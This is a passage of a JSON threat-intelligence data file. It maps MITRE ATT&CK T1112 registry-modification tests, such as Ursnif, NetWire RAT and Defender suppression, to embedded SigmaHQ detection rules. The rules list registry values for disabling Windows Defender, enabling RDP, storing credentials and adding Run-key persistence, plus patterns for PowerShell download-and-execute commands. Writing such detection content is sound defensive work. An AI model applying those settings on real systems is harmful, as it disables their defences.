                        "remote_content": "title: Potential Tampering With RDP Related Registry Keys Via Reg.EXE\nid: 0d5675be-bc88-4172-86d3-1e96a4476536\nstatus: test\ndescription: Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values\nreferences:\n    - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nauthor: pH-T (Nextron Systems), @Kostastsale, @TheDFIRReport\ndate: 2022-02-12\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\n    - attack.t1021.001\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_main_cli:\n        CommandLine|contains|all:\n            - ' add '\n            - '\\CurrentControlSet\\Control\\Terminal Server'\n            - 'REG_DWORD'\n            - ' /f'\n    selection_values_1:\n        CommandLine|contains|all:\n            - 'Licensing Core'\n            - 'EnableConcurrentSessions'\n    selection_values_2:\n        CommandLine|contains:\n            - 'WinStations\\RDP-Tcp'\n            - 'MaxInstanceCount'\n            - 'fEnableWinStation'\n            - 'TSUserEnabled'\n            - 'TSEnabled'\n            - 'TSAppCompat'\n            - 'IdleWinStationPoolCount'\n            - 'TSAdvertise'\n            - 'AllowTSConnections'\n            - 'fSingleSessionPerUser'\n            - 'fDenyTSConnections'\n    condition: all of selection_main_* and 1 of selection_values_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "35727d9e-7a7f-4d0c-a259-dc3906d6e8b9",
                "atomic_attack_name": "Mimic Ransomware - Allow Multiple RDP Sessions per User",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml",
                        "remote_content": "title: Potential Tampering With RDP Related Registry Keys Via Reg.EXE\nid: 0d5675be-bc88-4172-86d3-1e96a4476536\nstatus: test\ndescription: Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values\nreferences:\n    - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nauthor: pH-T (Nextron Systems), @Kostastsale, @TheDFIRReport\ndate: 2022-02-12\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\n    - attack.t1021.001\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_main_cli:\n        CommandLine|contains|all:\n            - ' add '\n            - '\\CurrentControlSet\\Control\\Terminal Server'\n            - 'REG_DWORD'\n            - ' /f'\n    selection_values_1:\n        CommandLine|contains|all:\n            - 'Licensing Core'\n            - 'EnableConcurrentSessions'\n    selection_values_2:\n        CommandLine|contains:\n            - 'WinStations\\RDP-Tcp'\n            - 'MaxInstanceCount'\n            - 'fEnableWinStation'\n            - 'TSUserEnabled'\n            - 'TSEnabled'\n            - 'TSAppCompat'\n            - 'IdleWinStationPoolCount'\n            - 'TSAdvertise'\n            - 'AllowTSConnections'\n            - 'fSingleSessionPerUser'\n            - 'fDenyTSConnections'\n    condition: all of selection_main_* and 1 of selection_values_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "d2c9e41e-cd86-473d-980d-b6403562e3e1",
                "atomic_attack_name": "Disable Windows Error Reporting Settings",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Reg Add Suspicious Paths",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml",
                        "remote_content": "title: Reg Add Suspicious Paths\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nstatus: test\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2022-10-10\ntags:\n    - attack.defense-evasion\n    - attack.t1112\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_windows_defender_tamper.yml",
                        "remote_content": "title: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE\nid: 452bce90-6fb0-43cc-97a5-affc283139b3\nstatus: test\ndescription: Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection\nreferences:\n    - https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\n    - https://github.com/swagkarna/Defeat-Defender-V1.2.0\n    - https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2\nauthor: Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-03-22\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_root_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_root_path:\n        CommandLine|contains:\n            - 'SOFTWARE\\Microsoft\\Windows Defender\\'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\'\n    selection_dword_0:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 0'\n        CommandLine|contains:\n            - 'DisallowExploitProtectionOverride'\n            - 'EnableControlledFolderAccess'\n            - 'MpEnablePus'\n            - 'PUAProtection'\n            - 'SpynetReporting'\n            - 'SubmitSamplesConsent'\n            - 'TamperProtection'\n    selection_dword_1:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 1'\n        CommandLine|contains:\n            - 'DisableAntiSpyware'\n            - 'DisableAntiSpywareRealtimeProtection'\n            - 'DisableAntiVirus'\n            - 'DisableArchiveScanning'\n            - 'DisableBehaviorMonitoring'\n            - 'DisableBlockAtFirstSeen'\n            - 'DisableConfig'\n            - 'DisableEnhancedNotifications'\n            - 'DisableIntrusionPreventionSystem'\n            - 'DisableIOAVProtection'\n            - 'DisableOnAccessProtection'\n            - 'DisablePrivacyMode'\n            - 'DisableRealtimeMonitoring'\n            - 'DisableRoutinelyTakingAction'\n            - 'DisableScanOnRealtimeEnable'\n            - 'DisableScriptScanning'\n            - 'Notification_Suppress'\n            - 'SignatureDisableUpdateOnStartupWithoutEngine'\n    condition: all of selection_root_* and 1 of selection_dword_*\nfalsepositives:\n    - Rare legitimate use by administrators to test software (should always be investigated)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "c375558d-7c25-45e9-bd64-7b23a97c1db0",
                "atomic_attack_name": "Ursnif Malware Registry Key Creation",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Reg Add Suspicious Paths",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml",
                        "remote_content": "title: Reg Add Suspicious Paths\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nstatus: test\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2022-10-10\ntags:\n    - attack.defense-evasion\n    - attack.t1112\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "65704cd4-6e36-4b90-b6c1-dc29a82c8e56",
                "atomic_attack_name": "NetWire RAT Registry Key Creation",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml",
                        "remote_content": "title: Potential Persistence Attempt Via Run Keys Using Reg.EXE\nid: de587dce-915e-4218-aac4-835ca6af6f70\nstatus: test\ndescription: Detects suspicious command line reg.exe tool adding key to RUN key in Registry\nreferences:\n    - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/\n    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-28\nmodified: 2023-01-30\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg'\n            - ' ADD '\n            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "c30dada3-7777-4590-b970-dc890b8cf113",
                "atomic_attack_name": "Suppress Win Defender Notifications",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Reg Add Suspicious Paths",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml",
                        "remote_content": "title: Reg Add Suspicious Paths\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nstatus: test\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2022-10-10\ntags:\n    - attack.defense-evasion\n    - attack.t1112\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_windows_defender_tamper.yml",
                        "remote_content": "title: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE\nid: 452bce90-6fb0-43cc-97a5-affc283139b3\nstatus: test\ndescription: Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection\nreferences:\n    - https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\n    - https://github.com/swagkarna/Defeat-Defender-V1.2.0\n    - https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2\nauthor: Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-03-22\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_root_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_root_path:\n        CommandLine|contains:\n            - 'SOFTWARE\\Microsoft\\Windows Defender\\'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\'\n    selection_dword_0:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 0'\n        CommandLine|contains:\n            - 'DisallowExploitProtectionOverride'\n            - 'EnableControlledFolderAccess'\n            - 'MpEnablePus'\n            - 'PUAProtection'\n            - 'SpynetReporting'\n            - 'SubmitSamplesConsent'\n            - 'TamperProtection'\n    selection_dword_1:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 1'\n        CommandLine|contains:\n            - 'DisableAntiSpyware'\n            - 'DisableAntiSpywareRealtimeProtection'\n            - 'DisableAntiVirus'\n            - 'DisableArchiveScanning'\n            - 'DisableBehaviorMonitoring'\n            - 'DisableBlockAtFirstSeen'\n            - 'DisableConfig'\n            - 'DisableEnhancedNotifications'\n            - 'DisableIntrusionPreventionSystem'\n            - 'DisableIOAVProtection'\n            - 'DisableOnAccessProtection'\n            - 'DisablePrivacyMode'\n            - 'DisableRealtimeMonitoring'\n            - 'DisableRoutinelyTakingAction'\n            - 'DisableScanOnRealtimeEnable'\n            - 'DisableScriptScanning'\n            - 'Notification_Suppress'\n            - 'SignatureDisableUpdateOnStartupWithoutEngine'\n    condition: all of selection_root_* and 1 of selection_dword_*\nfalsepositives:\n    - Rare legitimate use by administrators to test software (should always be investigated)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "c173c948-65e5-499c-afbe-433722ed5bd4",
                "atomic_attack_name": "Windows Add Registry Value to Load Service in Safe Mode with Network",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Add SafeBoot Keys Via Reg Utility",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_add_safeboot.yml",
                        "remote_content": "title: Add SafeBoot Keys Via Reg Utility\nid: d7662ff6-9e97-4596-a61d-9839e32dee8d\nrelated:\n    - id: fc0e89b5-adb0-43c1-b749-c12a10ec37de\n      type: similar\nstatus: test\ndescription: Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not\nreferences:\n    - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-02\nmodified: 2024-03-19\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_safeboot:\n        CommandLine|contains: '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'\n    selection_flag:\n        CommandLine|contains:\n            - ' copy '\n            - ' add '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5",
                "atomic_attack_name": "Windows Add Registry Value to Load Service in Safe Mode without Network",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Add SafeBoot Keys Via Reg Utility",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_add_safeboot.yml",
                        "remote_content": "title: Add SafeBoot Keys Via Reg Utility\nid: d7662ff6-9e97-4596-a61d-9839e32dee8d\nrelated:\n    - id: fc0e89b5-adb0-43c1-b749-c12a10ec37de\n      type: similar\nstatus: test\ndescription: Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not\nreferences:\n    - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-02\nmodified: 2024-03-19\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_safeboot:\n        CommandLine|contains: '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'\n    selection_flag:\n        CommandLine|contains:\n            - ' copy '\n            - ' add '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "95b25212-91a7-42ff-9613-124aca6845a8",
                "atomic_attack_name": "Windows Powershell Logging Disabled",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
                "atomic_attack_name": "Modify registry to store logon credentials",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Reg Add Suspicious Paths",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml",
                        "remote_content": "title: Reg Add Suspicious Paths\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nstatus: test\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2022-10-10\ntags:\n    - attack.defense-evasion\n    - attack.t1112\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "282f929a-6bc5-42b8-bd93-960c3ba35afe",
                "atomic_attack_name": "Modify Registry of Local Machine - cmd",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Direct Autorun Keys Modification",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_direct_asep_registry_keys_modification.yml",
                        "remote_content": "title: Direct Autorun Keys Modification\nid: 24357373-078f-44ed-9ac4-6d334a668a11\nstatus: test\ndescription: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-25\nmodified: 2022-08-04\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains: 'add'     # to avoid intersection with discovery tactic rules\n    selection_2:\n        CommandLine|contains:           # need to improve this list, there are plenty of ASEP reg keys\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run' # Also covers the strings \"RunOnce\", \"RunOnceEx\", \"RunServices\", \"RunServicesOnce\"\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n            - '\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml",
                        "remote_content": "title: Potential Persistence Attempt Via Run Keys Using Reg.EXE\nid: de587dce-915e-4218-aac4-835ca6af6f70\nstatus: test\ndescription: Detects suspicious command line reg.exe tool adding key to RUN key in Registry\nreferences:\n    - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/\n    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-28\nmodified: 2023-01-30\ntags:\n    - attack.persistence\n    - attack.t1547.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg'\n            - ' ADD '\n            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    condition: selection\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons.\n    - Legitimate administrator sets up autorun keys for legitimate reasons.\n    - Discord\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "9e3357ba-09d4-4fbd-a7c5-ad6386314513",
                    "487bb375-12ef-41f6-baae-c6a1572b4dd1",
                    "90f342e1-1aaa-4e43-b092-39fda57ed11e",
                    "d88d0ab2-e696-4d40-a2ed-9790064e66b3",
                    "5d64d069-0fa0-45a4-bd65-b6f0950d210f",
                    "4ac5fc44-a601-4c06-955b-309df8c4e9d4",
                    "c74d7efc-8826-45d9-b8bb-f04fac9e4eff",
                    "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
                    "96f697b0-b499-4e5d-9908-a67bec11cdb6",
                    "83314318-052a-4c90-a1ad-660ece38d276",
                    "1a2d6c47-75b0-45bd-b133-2c0be75349fd",
                    "5dee2bc3-47ac-4784-a52a-4da2950d210f",
                    "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
                    "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                    "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
                    "04b45a8a-d11d-49e4-9acc-4a1b524407a5",
                    "9d3436ef-9476-4c43-acca-90ce06bdf33a",
                    "ddd171b5-2cc6-4975-9e78-f0eccd08cc76",
                    "28ac00d6-22d9-4a3c-927f-bbd770104573",
                    "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
                    "c0580559-a6bd-4ef6-b9b7-83703d98b561",
                    "2ff692c2-4594-41ec-8fcb-46587de769e0",
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "c3198a27-23a0-4c2c-af19-e5328d49680e",
                    "0c93308a-3f1b-40a9-b649-57ea1a1c1d63",
                    "e2482f8d-3443-4237-b906-cc145d87a076",
                    "d6a9b252-c666-4de6-8806-5561bbbd3bdc",
                    "5ea0b0dc-45d0-4d5e-bed5-4271950d210f",
                    "ed202147-4026-4330-b5bd-1e8dfa8cf7cc",
                    "5a93eb65-dffa-4543-b761-94aa60098fb6",
                    "5118765f-6657-4ddb-a487-d7bd673abbf1",
                    "1c3121ed-041b-4d97-a075-07f54f20fb4a",
                    "b7b19cb6-9b32-4fc4-a108-73f19acfe262",
                    "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
                    "28036918-04d3-423d-91c0-55ecf99fb892",
                    "3ae1a046-f7db-439d-b7ce-b8b366b81fa6",
                    "a07f0359-4c90-4dc4-a681-8ffea40b4f47",
                    "41904ebe-d56c-4904-b9ad-7a77bdf154b3",
                    "0b80ade5-6997-4b1d-99a1-71701778ea61",
                    "62e0298b-e994-4189-bc87-bc699aa62d97",
                    "8f02c935-effe-45b3-8fc9-ef8696a9e41d",
                    "f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7",
                    "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
                    "fdbf0b9d-0182-4c43-893b-a1eaab92d085",
                    "e3fdf743-f05b-4051-990a-b66919be1743",
                    "5b175490-b652-4b02-b1de-5b5b4083c5f8",
                    "198effb6-6c98-4d0c-9ea3-451fa143c45c",
                    "277dc340-0540-42e7-8efb-5ff460045e07",
                    "92b0b372-a939-44ed-a11b-5136cf680e27",
                    "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
                    "1d218616-71b0-4c40-855b-9dbe75510f7f",
                    "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
